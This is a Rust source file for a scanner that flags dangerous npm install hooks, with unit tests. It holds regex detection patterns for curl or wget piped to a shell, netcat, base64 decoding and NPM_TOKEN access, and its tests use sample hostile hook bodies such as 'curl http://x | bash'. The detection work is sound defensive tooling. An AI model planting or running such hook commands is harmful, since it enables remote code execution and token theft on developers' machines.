//! npm install-hook scanner — Rust port of the pure core of
//! `packages/sca/supply_chain/install_hooks.py`.
//!
//! Inspects a `package.json`'s `scripts` lifecycle hooks (preinstall/install/…)
//! and flags known-dangerous command shapes. The file read + Manifest→host
//! resolution (`scan_manifests`, `_host_dep`, `_placeholder_for_manifest`) stay
//! call-site in Python; `scan_scripts` takes the already-read content + host dep.

use std::sync::OnceLock;

use mantishack_sca::{Confidence, Dependency};
use regex::Regex;
use serde_json::Value;

const LIFECYCLE_KEYS: &[&str] =
    &["preinstall", "install", "postinstall", "prepare", "prepublish", "prepublishOnly"];

/// One install-hook entry plus the patterns it triggered (`InstallHookHit`).
#[derive(Clone, Debug, PartialEq)]
pub struct InstallHookHit {
    pub script_key: String,
    pub script_body: String,
    pub reasons: Vec<String>,
}

/// Internal carrier for one flagged hook (`InstallHookFinding`).
#[derive(Clone, Debug, PartialEq)]
pub struct InstallHookFinding {
    pub dependency: Dependency,
    pub hit: InstallHookHit,
    pub severity: String,
    pub confidence: Confidence,
}

fn dangerous_patterns() -> &'static Vec<(Regex, &'static str)> {
    static PATS: OnceLock<Vec<(Regex, &'static str)>> = OnceLock::new();
    PATS.get_or_init(|| {
        let specs: &[(&str, &str)] = &[
            (r"\bcurl\s+[^|]*\s*\|\s*(?:bash|sh|zsh)\b", "curl piped to shell"),
            (r"\bwget\s+[^|]*\s*\|\s*(?:bash|sh)\b", "wget piped to shell"),
            (r"\bnc\s+(?:-[^ ]+\s+)*[\w.\-]+\s+\d+", "netcat to remote host"),
            (r#"\bbash\s+-c\s+["']?\$\("#, "bash -c with command substitution"),
            (r"\beval\s*\(", "eval() call"),
            (r"\bnode\s+-e\b", "node -e (inline JS execution)"),
            (r"\bpython\s+-c\b", "python -c (inline code execution)"),
            (r"base64\s+(?:-d|--decode)\s*\|", "base64 piped to decoder"),
            (r"echo\s+[A-Za-z0-9+/=]{40,}\s*\|\s*base64", "long base64 blob piped"),
            (r"\$\{?NPM_TOKEN\}?", "references NPM_TOKEN"),
            (r"process\.env\.[A-Z_]*TOKEN", "references *TOKEN env var"),
            (
                r"https?://[\w.\-]*(?:bit\.ly|tinyurl|pastebin|raw\.githubusercontent)",
                "URL to a paste/CDN host",
            ),
        ];
        specs.iter().map(|(re, why)| (Regex::new(re).unwrap(), *why)).collect()
    })
}

/// Scan a `package.json`'s scripts table (already-read `content`) for lifecycle
/// install hooks, attributing findings to `host` (the pure body of `_scan_one`).
pub fn scan_scripts(content: &str, host: &Dependency) -> Vec<InstallHookFinding> {
    let Ok(data) = serde_json::from_str::<Value>(content) else { return Vec::new() };
    let Some(scripts) = data.get("scripts").and_then(Value::as_object) else { return Vec::new() };

    let mut out = Vec::new();
    for &key in LIFECYCLE_KEYS {
        let Some(body) = scripts.get(key).and_then(Value::as_str) else { continue };
        if body.trim().is_empty() {
            continue;
        }
        let reasons: Vec<String> = dangerous_patterns()
            .iter()
            .filter(|(rgx, _)| rgx.is_match(body))
            .map(|(_, why)| why.to_string())
            .collect();
        let hit = InstallHookHit {
            script_key: key.to_string(),
            script_body: body.trim().to_string(),
            reasons: reasons.clone(),
        };
        let (severity, level, reason) = if reasons.is_empty() {
            ("low", "medium", "install hook present; behaviour not auto-flagged")
        } else {
            ("high", "high", "install hook matches known-dangerous pattern")
        };
        out.push(InstallHookFinding {
            dependency: host.clone(),
            hit,
            severity: severity.to_string(),
            confidence: Confidence::new(level, reason),
        });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use mantishack_sca::PinStyle;

    fn host() -> Dependency {
        Dependency {
            ecosystem: "npm".into(),
            name: "pkg".into(),
            version: Some("1".into()),
            declared_in: "x".into(),
            scope: "main".into(),
            is_lockfile: false,
            pin_style: PinStyle::Exact,
            direct: true,
            purl: "p".into(),
            parser_confidence: Confidence::new("high", ""),
            declared_license: None,
            commented_out: false,
            source_kind: "manifest".into(),
            source_extra: None,
        }
    }

    fn scan(content: &str) -> Vec<InstallHookFinding> {
        scan_scripts(content, &host())
    }

    #[test]
    fn dangerous_hook() {
        let f = scan(r#"{"scripts": {"postinstall": "curl http://x | bash", "build": "tsc"}}"#);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].hit.script_key, "postinstall");
        assert_eq!(f[0].hit.reasons, vec!["curl piped to shell"]);
        assert_eq!((f[0].severity.as_str(), f[0].confidence.level.as_str()), ("high", "high"));
        assert_eq!(f[0].confidence.reason, "install hook matches known-dangerous pattern");
    }

    #[test]
    fn benign_hook_is_low() {
        let f = scan(r#"{"scripts": {"postinstall": "node-gyp rebuild"}}"#);
        assert_eq!(f.len(), 1);
        assert!(f[0].hit.reasons.is_empty());
        assert_eq!((f[0].severity.as_str(), f[0].confidence.level.as_str()), ("low", "medium"));
        assert_eq!(f[0].confidence.reason, "install hook present; behaviour not auto-flagged");
    }

    #[test]
    fn multiple_patterns_in_order() {
        let f = scan(r#"{"scripts": {"preinstall": "eval(fetch()) && echo $NPM_TOKEN"}}"#);
        assert_eq!(f[0].hit.reasons, vec!["eval() call", "references NPM_TOKEN"]);
    }

    #[test]
    fn skips_and_edge_cases() {
        assert!(scan(r#"{"scripts": {"postinstall": "  "}}"#).is_empty()); // whitespace body
        assert!(scan(r#"{"name": "x"}"#).is_empty()); // no scripts
        assert!(scan("[]").is_empty()); // not an object
        // All six lifecycle keys are scanned in order.
        let f = scan(r#"{"scripts": {"preinstall": "a", "install": "b", "postinstall": "python -c 'x'", "prepare": "c", "prepublish": "d", "prepublishOnly": "e"}}"#);
        assert_eq!(f.len(), 6);
        assert_eq!(f.iter().map(|x| x.hit.script_key.as_str()).collect::<Vec<_>>(),
            vec!["preinstall", "install", "postinstall", "prepare", "prepublish", "prepublishOnly"]);
        assert_eq!(f[2].hit.reasons, vec!["python -c (inline code execution)"]);
    }
}
